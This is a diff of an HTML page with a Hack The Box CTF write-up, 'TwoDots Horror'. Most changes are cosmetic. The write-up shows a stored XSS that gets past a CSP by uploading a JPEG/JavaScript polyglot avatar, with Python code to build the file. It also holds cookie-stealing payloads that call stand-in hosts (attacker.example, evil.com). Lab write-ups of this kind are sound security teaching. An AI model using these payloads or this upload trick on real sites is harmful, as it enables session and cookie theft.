@@ -4,599 +4,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TwoDots Horror — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <title>TwoDots Horror - HTB CTF Writeup | Abdelaaziz Belkhair</title>
     <meta name="description"
-        content="HTB CTF Writeup: TwoDots Horror — JPEG/JavaScript polyglot file to bypass CSP and exfiltrate the admin bot's cookie via stored XSS.">
+        content="HTB CTF Writeup: TwoDots Horror - JPEG/JavaScript polyglot file to bypass CSP and exfiltrate the admin bot's cookie via stored XSS.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/writeups/twodots-horror.html">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/writeups/twodots-horror.html">
+  <meta property="og:title" content="TwoDots Horror - HTB CTF Writeup | Abdelaaziz Belkhair">
+  <meta property="og:description" content="HTB CTF Writeup: TwoDots Horror - JPEG/JavaScript polyglot file to bypass CSP and exfiltrate the admin bot's cookie via stored XSS.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="TwoDots Horror - HTB CTF Writeup | Abdelaaziz Belkhair">
+  <meta name="twitter:description" content="HTB CTF Writeup: TwoDots Horror - JPEG/JavaScript polyglot file to bypass CSP and exfiltrate the admin bot's cookie via stored XSS.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
-        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
         integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
         crossorigin="anonymous" referrerpolicy="no-referrer">
-    <style>
-        :root {
-            --primary: #00d4ff;
-            --accent: #ff6b6b;
-            --success: #00ff88;
-            --bg: #0a0a0a;
-            --bg-card: #111111;
-            --bg-terminal: #0d0d0d;
-            --text: #e4e4e7;
-            --text-secondary: #a1a1aa;
-            --text-muted: #71717a;
-            --border: #27272a;
-            --orange: #f97316;
-            --purple: #a78bfa;
-        }
-
-        *,
-        *::before,
-        *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            line-height: 1.8;
-        }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        a {
-            color: var(--primary);
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-
-        a:hover {
-            color: var(--success);
-        }
-
-        header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 100;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid var(--border);
-        }
-
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 24px;
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .logo {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 1.75rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-
-        main {
-            padding-top: 100px;
-            padding-bottom: 60px;
-        }
-
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: var(--text-secondary);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .back-link:hover {
-            color: var(--primary);
-        }
-
-        /* ── Challenge Card (HTB-style) ── */
-        .challenge-card {
-            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 2rem 2.5rem;
-            margin-bottom: 2rem;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .challenge-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
-        }
-
-        .challenge-card::after {
-            content: '';
-            position: absolute;
-            top: -60px;
-            right: -60px;
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
-        .challenge-platform {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--success);
-            background: rgba(0, 255, 136, 0.1);
-            padding: 0.3rem 0.75rem;
-            border-radius: 20px;
-            margin-bottom: 1rem;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .challenge-title {
-            font-size: 2.2rem;
-            font-weight: 700;
-            line-height: 1.2;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .challenge-subtitle {
-            color: var(--text-secondary);
-            font-size: 1.05rem;
-            margin-bottom: 1.5rem;
-            max-width: 650px;
-        }
-
-        .challenge-meta {
-            display: flex;
-            gap: 0.6rem;
-            flex-wrap: wrap;
-            margin-bottom: 1.5rem;
-        }
-
-        .meta-badge {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            padding: 0.3rem 0.7rem;
-            border-radius: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            font-weight: 600;
-        }
-
-        .meta-badge.date {
-            color: var(--primary);
-            background: rgba(0, 212, 255, 0.12);
-        }
-
-        .meta-badge.category {
-            color: var(--purple);
-            background: rgba(167, 139, 250, 0.12);
-        }
-
-        .meta-badge.tag {
-            color: var(--orange);
-            background: rgba(249, 115, 22, 0.12);
-        }
-
-        .challenge-stats {
-            display: flex;
-            gap: 1px;
-            background: var(--border);
-            border-radius: 12px;
-            overflow: hidden;
-            margin-top: 0.5rem;
-        }
-
-        .stat-item {
-            flex: 1;
-            padding: 1rem;
-            text-align: center;
-            background: var(--bg-card);
-        }
-
-        .stat-item:first-child {
-            border-radius: 12px 0 0 12px;
-        }
-
-        .stat-item:last-child {
-            border-radius: 0 12px 12px 0;
-        }
-
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.3rem;
-            font-weight: 700;
-            display: block;
-        }
-
-        .stat-value.difficulty-medium {
-            color: var(--orange);
-        }
-
-        .stat-value.difficulty-hard {
-            color: var(--accent);
-        }
-
-        .stat-value.difficulty-easy {
-            color: var(--success);
-        }
-
-        .stat-value.impact {
-            color: var(--accent);
-        }
-
-        .stat-value.vulns {
-            color: var(--primary);
-        }
-
-        .stat-label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 0.25rem;
-        }
-
-        /* ── Table of Contents ── */
-        .toc {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 1.25rem 1.5rem;
-            margin-bottom: 2rem;
-        }
-
-        .toc-title {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 0.75rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .toc-title::before {
-            content: '';
-            width: 12px;
-            height: 2px;
-            background: var(--orange);
-        }
-
-        .toc ol {
-            list-style: none;
-            counter-reset: toc-counter;
-            padding: 0;
-            margin: 0;
-        }
-
-        .toc li {
-            counter-increment: toc-counter;
-            margin-bottom: 0.25rem;
-        }
-
-        .toc li a {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            padding: 0.35rem 0.5rem;
-            border-radius: 6px;
-            transition: all 0.15s;
-        }
-
-        .toc li a:hover {
-            color: var(--orange);
-            background: rgba(249, 115, 22, 0.06);
-        }
-
-        .toc li a::before {
-            content: counter(toc-counter, decimal-leading-zero);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            min-width: 20px;
-        }
-
-        /* ── Article Content ── */
-        .article-content h2 {
-            font-size: 1.35rem;
-            margin: 2.5rem 0 1rem;
-            color: var(--text);
-            padding-bottom: 0.6rem;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-
-        .article-content h2::before {
-            content: '';
-            width: 4px;
-            height: 22px;
-            background: var(--orange);
-            border-radius: 2px;
-            flex-shrink: 0;
-        }
-
-        .article-content h3 {
-            font-size: 1.1rem;
-            margin: 1.5rem 0 0.75rem;
-            color: var(--text);
-        }
-
-        .article-content h4 {
-            font-size: 0.95rem;
-            margin: 1.25rem 0 0.5rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content p {
-            margin-bottom: 1rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content ul,
-        .article-content ol {
-            margin: 1rem 0;
-            padding-left: 1.5rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content li {
-            margin-bottom: 0.5rem;
-        }
-
-        /* ── Code Blocks ── */
-        .article-content pre {
-            background: var(--bg-terminal);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            padding: 1.25rem;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            line-height: 1.6;
-            position: relative;
-        }
-
-        .article-content pre::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
-            border-radius: 10px 10px 0 0;
-        }
-
-        .article-content code {
-            font-family: 'JetBrains Mono', monospace;
-            background: rgba(249, 115, 22, 0.1);
-            padding: 0.15rem 0.45rem;
-            border-radius: 4px;
-            font-size: 0.83em;
-            color: var(--orange);
-        }
-
-        .article-content pre code {
-            background: none;
-            padding: 0;
-            color: var(--text-secondary);
-        }
-
-        /* ── Info & Warning Boxes ── */
-        .info-box {
-            background: rgba(0, 212, 255, 0.06);
-            border: 1px solid rgba(0, 212, 255, 0.15);
-            border-left: 3px solid var(--primary);
-            padding: 1.25rem 1.5rem;
-            border-radius: 0 10px 10px 0;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        .warning-box {
-            background: rgba(255, 107, 107, 0.06);
-            border: 1px solid rgba(255, 107, 107, 0.15);
-            border-left: 3px solid var(--accent);
-            padding: 1.25rem 1.5rem;
-            border-radius: 0 10px 10px 0;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        /* ── Tables ── */
-        table {
-            width: 100%;
-            border-collapse: separate;
-            border-spacing: 0;
-            margin: 1.5rem 0;
-            font-size: 0.85rem;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid var(--border);
-        }
-
-        th,
-        td {
-            padding: 0.7rem 1rem;
-            text-align: left;
-        }
-
-        th {
-            background: var(--bg-terminal);
-            color: var(--primary);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.78rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        td {
-            color: var(--text-secondary);
-            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
-        }
-
-        tr:last-child td {
-            border-bottom: none;
-        }
-
-        tr:hover td {
-            background: rgba(249, 115, 22, 0.03);
-        }
-
-        td code {
-            font-size: 0.8em;
-        }
-
-        hr {
-            border: none;
-            border-top: 1px solid var(--border);
-            margin: 2rem 0;
-        }
-
-        /* ── Pwned Banner ── */
-        .pwned-banner {
-            text-align: center;
-            padding: 2.5rem 2rem;
-            margin: 3rem 0 1rem;
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
-            border: 1px solid rgba(0, 255, 136, 0.2);
-            border-radius: 16px;
-            position: relative;
-        }
-
-        .pwned-banner::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--success), var(--primary));
-        }
-
-        .pwned-icon {
-            font-size: 2.5rem;
-            margin-bottom: 0.75rem;
-            display: block;
-        }
-
-        .pwned-text {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--success);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-        }
-
-        .pwned-sub {
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            margin-top: 0.5rem;
-        }
-
-        /* ── Footer ── */
-        footer {
-            padding: 1.5rem 0;
-            border-top: 1px solid var(--border);
-            text-align: center;
-        }
-
-        footer p {
-            color: var(--text-muted);
-            font-size: 0.8rem;
-        }
-
-        /* ── Responsive ── */
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-            }
-
-            .challenge-title {
-                font-size: 1.6rem;
-            }
-
-            .challenge-card {
-                padding: 1.5rem;
-            }
-
-            .challenge-stats {
-                flex-wrap: wrap;
-            }
-
-            .stat-item {
-                min-width: 80px;
-            }
-
-            table {
-                font-size: 0.75rem;
-            }
-
-            th,
-            td {
-                padding: 0.4rem 0.6rem;
-            }
-
-            .toc {
-                display: none;
-            }
-        }
-    </style>
+    <link rel="stylesheet" href="../assets/css/writeup.css">
 </head>
 
 <body>
@@ -604,16 +31,18 @@
         <nav>
             <a href="../index.html" class="logo">AB_</a>
             <ul class="nav-links">
-                <li><a href="../index.html">Accueil</a></li>
-                <li><a href="../blog.html">Blog</a></li>
-                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#snapshot">Profil</a></li>
+                <li><a href="../projects.html">Travail</a></li>
+                <li><a href="../writeups.html" class="active">Writeups</a></li>
+                <li><a href="../blog.html">Articles</a></li>
                 <li><a href="../index.html#contact">Contact</a></li>
-            </ul>
+              <li><a href="../cv.pdf" download>CV</a></li>
+  </ul>
         </nav>
     </header>
 
     <main class="container">
-        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux analyses</a>
 
         <article>
             <div class="challenge-card">
@@ -655,10 +84,10 @@
                 <ol>
                     <li><a href="#s1">Reconnaissance</a></li>
                     <li><a href="#s2">Source Code Deep Dive</a></li>
-                    <li><a href="#s3">The Dead Ends — What Didn't Work</a></li>
-                    <li><a href="#s4">The Breakthrough — JPEG/JS Polyglot</a></li>
+                    <li><a href="#s3">The Dead Ends - What Didn't Work</a></li>
+                    <li><a href="#s4">The Breakthrough - JPEG/JS Polyglot</a></li>
                     <li><a href="#s5">Building the Exploit</a></li>
-                    <li><a href="#s6">Exploitation — Putting It All Together</a></li>
+                    <li><a href="#s6">Exploitation - Putting It All Together</a></li>
                     <li><a href="#s7">Full Attack Chain</a></li>
                     <li><a href="#s8">Why Other Approaches Failed</a></li>
                     <li><a href="#s9">Key Takeaways</a></li>
@@ -685,7 +114,7 @@
 
                 <h3>The Application at a Glance</h3>
 
-                <p>TwoDots Horror is a Node.js Express application — a community board where users register, log in,
+                <p>TwoDots Horror is a Node.js Express application - a community board where users register, log in,
                     post stories, and upload profile avatars. Behind the scenes, there's an admin bot (Puppeteer,
                     Chromium 90) that visits a special <code>/review</code> page whenever someone submits a new post.
                     The flag lives as a browser cookie on that bot.</p>
@@ -708,7 +137,7 @@ async function purgeData(db){
 };</code></pre>
 
                 <p>Two things jumped out immediately. First, the flag can <em>only</em> be stolen through a client-side
-                    attack — there's no file to read on disk, no database entry to dump. I need XSS that executes in the
+                    attack - there's no file to read on disk, no database entry to dump. I need XSS that executes in the
                     bot's browser context. Second, after every submission, <code>db.migrate()</code> wipes the entire
                     database clean. Every attempt is a fresh start: re-register, re-upload, re-submit. No room for
                     iterative debugging.</p>
@@ -757,18 +186,18 @@ async function purgeData(db){
                 <p>A few observations I noted before diving into the source:</p>
 
                 <ul>
-                    <li>The <code>/review</code> endpoint is <strong>localhost-only</strong> — if your IP isn't
+                    <li>The <code>/review</code> endpoint is <strong>localhost-only</strong> - if your IP isn't
                         <code>127.0.0.1</code>, you get redirected. Only the bot can see it.
                     </li>
                     <li>Submitted posts must contain <strong>exactly 2 dots</strong>. Nothing more, nothing less. A
                         quirky restriction, but trivial to satisfy.</li>
-                    <li>Uploaded avatars are saved using their <strong>MD5 hash as the filename</strong> — no file
+                    <li>Uploaded avatars are saved using their <strong>MD5 hash as the filename</strong> - no file
                         extension attached.</li>
                 </ul>
 
                 <h2 id="s2">2. Source Code Deep Dive</h2>
 
-                <h3>The XSS Entry Point — Nunjucks' Deceptive <code>|safe</code> Filter</h3>
+                <h3>The XSS Entry Point - Nunjucks' Deceptive <code>|safe</code> Filter</h3>
 
                 <p>Here's the line in <code>review.html</code> that makes this whole exploit possible:</p>
 
@@ -783,8 +212,8 @@ async function purgeData(db){
                         variable will not be escaped."</em>
                 </div>
 
-                <p>So post content is rendered as <strong>raw HTML</strong> on the review page. Anything I submit —
-                    including <code>&lt;script&gt;</code> tags — will be interpreted as real DOM elements by the bot's
+                <p>So post content is rendered as <strong>raw HTML</strong> on the review page. Anything I submit -
+                    including <code>&lt;script&gt;</code> tags - will be interpreted as real DOM elements by the bot's
                     browser. That's my injection point. But there's a catch: the CSP.</p>
 
                 <h3>The CSP Wall</h3>
@@ -798,17 +227,17 @@ async function purgeData(db){
                     means:</p>
 
                 <ul>
-                    <li>❌ Inline scripts (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)</li>
-                    <li>❌ Inline event handlers (<code>onerror=</code>, <code>onload=</code>)</li>
-                    <li>❌ External scripts (<code>&lt;script src="http://evil.com/x.js"&gt;</code>)</li>
-                    <li>❌ <code>eval()</code>, <code>data:</code> URIs, <code>javascript:</code> URIs</li>
-                    <li>✅ Scripts loaded from the <strong>same origin</strong></li>
+                    <li>Failed: Inline scripts (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)</li>
+                    <li>Failed: Inline event handlers (<code>onerror=</code>, <code>onload=</code>)</li>
+                    <li>Failed: External scripts (<code>&lt;script src="http://evil.com/x.js"&gt;</code>)</li>
+                    <li>Failed: <code>eval()</code>, <code>data:</code> URIs, <code>javascript:</code> URIs</li>
+                    <li>Passes: Scripts loaded from the <strong>same origin</strong></li>
                 </ul>
 
                 <p>The <em>only</em> way to execute JavaScript is to load a script from the challenge server itself. And
                     the only thing I can upload to the server is... a JPEG avatar.</p>
 
-                <h3>The Upload Mechanics — Where Things Get Interesting</h3>
+                <h3>The Upload Mechanics - Where Things Get Interesting</h3>
 
                 <p>The avatar upload endpoint validates files with two checks:</p>
 
@@ -822,7 +251,7 @@ if(!(dimensions.width &gt;= 120 &amp;&amp; dimensions.height &gt;= 120)) {
                 <p>Let me break down what each check <em>actually</em> does:</p>
 
                 <ul>
-                    <li><strong><code>is-jpg</code></strong> (v2.0.0): Checks <em>only</em> the first 3 bytes —
+                    <li><strong><code>is-jpg</code></strong> (v2.0.0): Checks <em>only</em> the first 3 bytes -
                         <code>FF D8 FF</code>, the JPEG magic number. That's it. It doesn't parse the file at all.
                     </li>
                     <li><strong><code>image-size</code></strong>: Reads JPEG segment markers to find the SOF (Start of
@@ -833,12 +262,12 @@ if(!(dimensions.width &gt;= 120 &amp;&amp; dimensions.height &gt;= 120)) {
                     absolutely anything after the JPEG structure, and both checks will pass as long as the magic bytes
                     and a valid SOF marker exist.</p>
 
-                <p>Now here's the critical detail — how the avatar gets served:</p>
+                <p>Now here's the critical detail - how the avatar gets served:</p>
 
-                <pre><code>// Saved as MD5 hash — no extension
+                <pre><code>// Saved as MD5 hash - no extension
 uploadPath = path.join(__dirname, '/../uploads', file.md5);
 
-// Served via sendFile — no Content-Type override
+// Served via sendFile - no Content-Type override
 avatar = path.join(__dirname, '/../uploads', user.avatar);
 return res.sendFile(avatar);</code></pre>
 
@@ -849,7 +278,7 @@ return res.sendFile(avatar);</code></pre>
                     unlocks everything.
                 </p>
 
-                <h2 id="s3">3. The Dead Ends — What Didn't Work</h2>
+                <h2 id="s3">3. The Dead Ends - What Didn't Work</h2>
 
                 <p>Before I landed on the polyglot approach, I burned a lot of time on standard techniques that all hit
                     the CSP wall:</p>
@@ -858,7 +287,7 @@ return res.sendFile(avatar);</code></pre>
 
                 <pre><code>&lt;img src=x onerror="fetch('https://attacker/?c='+btoa(document.cookie))"&gt;</code></pre>
 
-                <p>Blocked. <code>onerror</code> is an inline handler — CSP shuts it down instantly. Plus, this payload
+                <p>Blocked. <code>onerror</code> is an inline handler - CSP shuts it down instantly. Plus, this payload
                     has way more than 2 dots.</p>
 
                 <h3>External Scripts</h3>
@@ -875,12 +304,12 @@ return res.sendFile(avatar);</code></pre>
 
                 <div class="warning-box">
                     <strong>The realization</strong>: Every traditional XSS technique is dead on arrival. The CSP is
-                    tight — <code>default-src 'self'</code> with no <code>unsafe-inline</code>, no nonces, no hashes.
+                    tight - <code>default-src 'self'</code> with no <code>unsafe-inline</code>, no nonces, no hashes.
                     The only viable path is uploading something to the server that Chrome will execute as JavaScript.
                     And the only upload mechanism is the avatar endpoint, which demands a JPEG file.
                 </div>
 
-                <h2 id="s4">4. The Breakthrough — JPEG/JavaScript Polyglot</h2>
+                <h2 id="s4">4. The Breakthrough - JPEG/JavaScript Polyglot</h2>
 
                 <h3>Making Two Parsers Agree</h3>
 
@@ -904,7 +333,7 @@ return res.sendFile(avatar);</code></pre>
                     JavaScript parser would choke on the very first byte.</p>
 
                 <p>The solution: specify <code>charset="ISO-8859-1"</code> on the script tag. In Latin-1, every single
-                    byte value (0x00–0xFF) maps to a valid character. The JPEG magic bytes become perfectly valid
+                    byte value (0x00-0xFF) maps to a valid character. The JPEG magic bytes become perfectly valid
                     JavaScript identifier characters:</p>
 
                 <table>
@@ -927,7 +356,7 @@ return res.sendFile(avatar);</code></pre>
                             <td>Valid identifier chars</td>
                         </tr>
                         <tr>
-                            <td colspan="3"><code>FF D8 FF E0</code> → <code>ÿØÿà</code> — a valid JavaScript variable
+                            <td colspan="3"><code>FF D8 FF E0</code> → <code>ÿØÿà</code> - a valid JavaScript variable
                                 name!</td>
                         </tr>
                     </tbody>
@@ -938,7 +367,7 @@ return res.sendFile(avatar);</code></pre>
                 <p>Here's where it gets beautiful. In JPEG, the two bytes after the APP0 marker (<code>FF E0</code>)
                     specify the segment length. I set this to <code>2F 2A</code>, which equals 12,074 in decimal. The
                     JPEG parser reads: "this APP0 segment is 12,074 bytes long" and skips ahead that many bytes. The
-                    JavaScript parser reads the exact same two bytes as <code>/*</code> — the opening of a block comment
+                    JavaScript parser reads the exact same two bytes as <code>/*</code> - the opening of a block comment
                     that swallows all the ugly JPEG binary data.</p>
 
                 <p>One pair of bytes. Two completely different meanings. Both perfectly valid.</p>
@@ -1031,13 +460,13 @@ class EXP_JPEG:
 
                 <h3>The XSS Payload</h3>
 
-                <p>CSP blocks <code>fetch()</code> and <code>XMLHttpRequest</code> to external domains —
+                <p>CSP blocks <code>fetch()</code> and <code>XMLHttpRequest</code> to external domains -
                     <code>connect-src</code> inherits <code>'self'</code>. But CSP doesn't restrict <strong>page
                         navigation</strong>. <code>document.location</code> is completely outside CSP's scope. So my
                     exfiltration method is a simple redirect:
                 </p>
 
-                <pre><code>document.location.href = "http://yqjiie22.requestrepo.com/?c=" + btoa(document.cookie);</code></pre>
+                <pre><code>document.location.href = "http://attacker.example/?c=" + btoa(document.cookie);</code></pre>
 
                 <p>The bot's browser navigates to my listener with the cookie base64-encoded in the URL. Clean,
                     reliable, and CSP-proof.</p>
@@ -1051,16 +480,16 @@ img = Image.new('RGB', (120, 120), color=(255, 0, 0))
 img.save('valid_image.jpg', format='JPEG', quality=75)
 
 # Build the polyglot
-payload = 'document.location.href="http://yqjiie22.requestrepo.com/?c="+btoa(document.cookie);'
+payload = 'document.location.href="http://attacker.example/?c="+btoa(document.cookie);'
 exp = EXP_JPEG('valid_image.jpg', payload)
 with open('exploit.jpg', 'wb') as f:
     f.write(exp.generate())</code></pre>
 
-                <h2 id="s6">6. Exploitation — Putting It All Together</h2>
+                <h2 id="s6">6. Exploitation - Putting It All Together</h2>
 
                 <h3>Step 1: Register and Login</h3>
 
-                <p>I created a fresh account with the username <code>test</code> (no dots in the name — important for
+                <p>I created a fresh account with the username <code>test</code> (no dots in the name - important for
                     the avatar URL). Logged in, got my JWT session cookie.</p>
 
                 <h3>Step 2: Upload the Polyglot</h3>
@@ -1068,14 +497,14 @@ with open('exploit.jpg', 'wb') as f:
                 <p>Uploaded <code>exploit.jpg</code> as my profile avatar. The server validated it:</p>
 
                 <ul>
-                    <li>✅ First 3 bytes are <code>FF D8 FF</code> → passes <code>is-jpg</code></li>
-                    <li>✅ SOF marker found with 120×120 dimensions → passes <code>image-size</code></li>
-                    <li>✅ File saved as MD5 hash (no extension) → will be served as
+                    <li>Passes: First 3 bytes are <code>FF D8 FF</code> → passes <code>is-jpg</code></li>
+                    <li>Passes: SOF marker found with 120×120 dimensions → passes <code>image-size</code></li>
+                    <li>Passes: File saved as MD5 hash (no extension) → will be served as
                         <code>application/octet-stream</code>
                     </li>
                 </ul>
 
-                <p>I verified by hitting <code>/api/avatar/test</code> — sure enough,
+                <p>I verified by hitting <code>/api/avatar/test</code> - sure enough,
                     <code>Content-Type: application/octet-stream</code>. Not <code>image/jpeg</code>. Chrome won't block
                     this as a script source.
                 </p>
@@ -1089,11 +518,11 @@ with open('exploit.jpg', 'wb') as f:
                 <p>Breaking this down:</p>
 
                 <ul>
-                    <li><code>charset="ISO-8859-1"</code> — forces Chrome to interpret the polyglot bytes as Latin-1
+                    <li><code>charset="ISO-8859-1"</code> - forces Chrome to interpret the polyglot bytes as Latin-1
                     </li>
-                    <li><code>src="/api/avatar/test"</code> — loads the polyglot from the same origin (CSP allows it!)
+                    <li><code>src="/api/avatar/test"</code> - loads the polyglot from the same origin (CSP allows it!)
                     </li>
-                    <li><code>..</code> — adds exactly 2 dots to satisfy the content filter</li>
+                    <li><code>..</code> - adds exactly 2 dots to satisfy the content filter</li>
                 </ul>
 
                 <p>The server responded: <em>"Your submission is awaiting approval by Admin!"</em></p>
@@ -1101,7 +530,7 @@ with open('exploit.jpg', 'wb') as f:
                 <h3>Step 4: The Bot Does the Rest</h3>
 
                 <p>The submission handler triggers <code>purgeData()</code>. The bot launches Chromium, sets the
-                    <code>flag</code> cookie, visits <code>/review</code>. My post is rendered with <code>|safe</code> —
+                    <code>flag</code> cookie, visits <code>/review</code>. My post is rendered with <code>|safe</code> -
                     the script tag goes into the DOM as real HTML. Chrome loads <code>/api/avatar/test</code>,
                     interprets it as JavaScript (Latin-1 charset), and executes my payload. The bot's browser redirects
                     to my listener.
@@ -1122,7 +551,7 @@ flag=HTB{REDACTED}</code></pre>
                 <h2 id="s7">7. Full Attack Chain</h2>
 
                 <pre><code>┌─────────────────────────────────────────────────────────────────────┐
-│                  TWODOTS HORROR — FULL KILL CHAIN                   │
+│                  TWODOTS HORROR - FULL KILL CHAIN                   │
 ├──────────┬──────────────────────────────────────────────────────────┤
 │ Step 1   │ Register + Login                                        │
 │          │ Create account, get JWT session cookie                   │
@@ -1169,7 +598,7 @@ flag=HTB{REDACTED}</code></pre>
                         </tr>
                         <tr>
                             <td>Direct <code>fetch()</code> exfiltration</td>
-                            <td><code>connect-src</code> inherits <code>'self'</code> — external requests blocked</td>
+                            <td><code>connect-src</code> inherits <code>'self'</code> - external requests blocked</td>
                         </tr>
                         <tr>
                             <td>SSTI via Nunjucks</td>
@@ -1178,7 +607,7 @@ flag=HTB{REDACTED}</code></pre>
                         </tr>
                         <tr>
                             <td>JWT forgery</td>
-                            <td>Secret is randomized at Docker build time — not brute-forceable</td>
+                            <td>Secret is randomized at Docker build time - not brute-forceable</td>
                         </tr>
                         <tr>
                             <td>SQL injection</td>
@@ -1186,7 +615,7 @@ flag=HTB{REDACTED}</code></pre>
                         </tr>
                         <tr>
                             <td>Upload path traversal</td>
-                            <td>Filename is the file's MD5 hash — no user-controlled path</td>
+                            <td>Filename is the file's MD5 hash - no user-controlled path</td>
                         </tr>
                     </tbody>
                 </table>
@@ -1203,7 +632,7 @@ flag=HTB{REDACTED}</code></pre>
                     <tbody>
                         <tr>
                             <td>Nunjucks <code>|safe</code></td>
-                            <td>The name is misleading — it <em>disables</em> escaping, not enables it. Always read the
+                            <td>The name is misleading - it <em>disables</em> escaping, not enables it. Always read the
                                 docs.</td>
                         </tr>
                         <tr>
@@ -1224,12 +653,12 @@ flag=HTB{REDACTED}</code></pre>
                         </tr>
                         <tr>
                             <td><code>charset="ISO-8859-1"</code></td>
-                            <td>Latin-1 maps every byte 0x00–0xFF to a valid character, making JPEG headers usable as JS
+                            <td>Latin-1 maps every byte 0x00-0xFF to a valid character, making JPEG headers usable as JS
                                 identifiers.</td>
                         </tr>
                         <tr>
                             <td>CSP vs Navigation</td>
